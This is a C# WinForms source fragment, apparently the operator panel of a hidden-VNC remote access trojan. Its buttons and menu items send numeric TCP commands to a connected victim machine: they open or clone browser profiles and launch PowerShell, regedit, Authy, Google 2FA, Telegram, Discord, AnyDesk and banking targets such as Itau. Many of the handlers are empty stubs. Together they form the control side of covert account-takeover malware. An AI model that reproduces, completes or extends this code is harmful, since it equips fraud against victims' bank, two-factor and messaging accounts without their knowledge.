            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox33)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox15)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox25)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox32)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox26)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Guna2PictureBox80)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox23)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

		}
        private void chromeToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        private void edgeToolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }
        private void braveToolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }
        private void firefoxToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        private void explorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }
        private void powershellToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            
        }
        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }
        private void highQualityToolStripMenuItem_Click(object sender, EventArgs e)
        {
           


        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        private void killProcessToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void toolStripMenuItem5_Click_1(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            
        }

        private void powershellToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
           
        }

        private void promptDeCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            
        }

        private void calculateToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void controlPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void microsoftWordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void microsoftExcelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            

        }

        private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void settingsWindowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }
        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void regeditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
           
        }

        private void oneDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void authyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void remoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            
        }

        private void anydeskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void telegramToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void discordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void teamViewerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void steamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            

        }

        private void newPageToolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }

        private void newPageToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem5_Click(object sender, EventArgs e)
        {
           
        }

        private void newPageToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            
        }

        private void highQualityToolStripMenuItem1_Click(object sender, EventArgs e)
        {
           
        
        }

        private void google2FAToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void newPageToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            
        }

        private void avastSecurityToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void openBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("9107*", tcpClient_0);

        }

        private void authyToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
           
        }

        private void toolStripMenuItem2_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem8_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem7_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem6_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem5_Click_2(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem4_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem3_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem11_Click_1(object sender, EventArgs e)
        {
            
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem7_Click(object sender, EventArgs e)
        {
            
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem8_Click(object sender, EventArgs e)
        {
            
        }

        private void newPageToolStripMenuItem9_Click(object sender, EventArgs e)
        {
            

        }

        private void supremoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            

        }

        private void newPageToolStripMenuItem10_Click(object sender, EventArgs e)
        {
            

        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2PictureBox36_Click(object sender, EventArgs e)
        {
            SendTCP("9108*", tcpClient_0);
        }

        private void Guna2CirclePictureBox1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Guna2CirclePictureBox3_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC = new FrmVNC();
            frmVNC.WindowState = FormWindowState.Minimized;

        }

        private void Guna2PictureBox80_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2PictureBox14_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2PictureBox15_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2PictureBox16_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2PictureBox17_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();
                SendTCP("9099*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("9099*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
            }
        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            SendTCP("9103*", tcpClient_0);
        }

        private void guna2PictureBox3_Click(object sender, EventArgs e)
        {
            SendTCP("9104*", tcpClient_0);
        }

        private void guna2PictureBox13_Click(object sender, EventArgs e)
        {
            SendTCP("9106*", tcpClient_0);
        }

        private void guna2PictureBox18_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        private void guna2PictureBox44_Click(object sender, EventArgs e)
        {
            SendTCP("9097*", tcpClient_0);
        }

        private void guna2PictureBox21_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        private void guna2PictureBox27_Click(object sender, EventArgs e)
        {
            SendTCP("9091*", tcpClient_0);
        }

        private void guna2PictureBox28_Click(object sender, EventArgs e)
        {
            SendTCP("9092*", tcpClient_0);
        }

        private void guna2PictureBox8_Click(object sender, EventArgs e)
        {
            SendTCP("9093*", tcpClient_0);
        }

        private void guna2PictureBox9_Click(object sender, EventArgs e)
        {
            SendTCP("9100*", tcpClient_0);
        }

        private void guna2PictureBox10_Click(object sender, EventArgs e)
        {
            SendTCP("9094*", tcpClient_0);
        }

        private void guna2PictureBox11_Click(object sender, EventArgs e)
        {
            SendTCP("9098*", tcpClient_0);
        }

        private void guna2PictureBox12_Click(object sender, EventArgs e)
        {
            SendTCP("9096*", tcpClient_0);
        }

        private void guna2PictureBox4_Click(object sender, EventArgs e)
        {
            SendTCP("9102*", tcpClient_0);
        }

        private void guna2PictureBox6_Click(object sender, EventArgs e)
        {
            SendTCP("9105*", tcpClient_0);
        }

        private void guna2PictureBox7_Click(object sender, EventArgs e)
        {
            SendTCP("9111*", tcpClient_0);
        }

        private void guna2PictureBox41_Click(object sender, EventArgs e)
        {
            SendTCP("9095*", tcpClient_0);
        }

        private void guna2PictureBox42_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        private void guna2PictureBox43_Click(object sender, EventArgs e)
        {
            ResizeScroll.Value = 100;
            QualityScroll.Value = 100;
            chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
            QualityLabel.Text = "HQ : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value = 100), tcpClient_0);
        }

        private void guna2PictureBox24_Click(object sender, EventArgs e)
        {
            SendTCP("9101*", tcpClient_0);
        }

        private void guna2PictureBox25_Click(object sender, EventArgs e)
        {
            SendTCP("9109*", tcpClient_0);
        }

        private void guna2PictureBox37_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }

        private void guna2PictureBox26_Click(object sender, EventArgs e)
        {
            SendTCP("9110*", tcpClient_0);
        }

        private void guna2PictureBox45_Click(object sender, EventArgs e)
        {
            SendTCP("9112*", tcpClient_0);
        }

        private void guna2PictureBox23_Click(object sender, EventArgs e)
        {
            guna2Transition1.ShowSync(Painel_1);
        }

        private void guna2PictureBox32_Click(object sender, EventArgs e)
        {
            SendTCP("20021*", tcpClient_0);
        }

        private void itauToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("20021*", tcpClient_0);

        }

        private void guna2PictureBox33_Click(object sender, EventArgs e)
        {
            SendTCP("20022*", tcpClient_0);
        }

        private void guna2PictureBox34_Click(object sender, EventArgs e)
        {
            SendTCP("20023*", tcpClient_0);
        }

        private void guna2PictureBox35_Click(object sender, EventArgs e)
        {
            SendTCP("20024*", tcpClient_0);
        }

        private void guna2PictureBox38_Click(object sender, EventArgs e)
        {
            SendTCP("20025*", tcpClient_0);
        }

        private void guna2PictureBox39_Click(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox39_Click_1(object sender, EventArgs e)
        {
            guna2Transition1.ShowSync(Painel_1);
            Icon_Home.Visible = false;
            Icon_Application.Visible = true;
        }

        private void guna2PictureBox46_Click(object sender, EventArgs e)
        {
            guna2Transition1.HideSync(Painel_1);
            Icon_Application.Visible = false;
            Icon_Home.Visible = true;

        }
    }
}
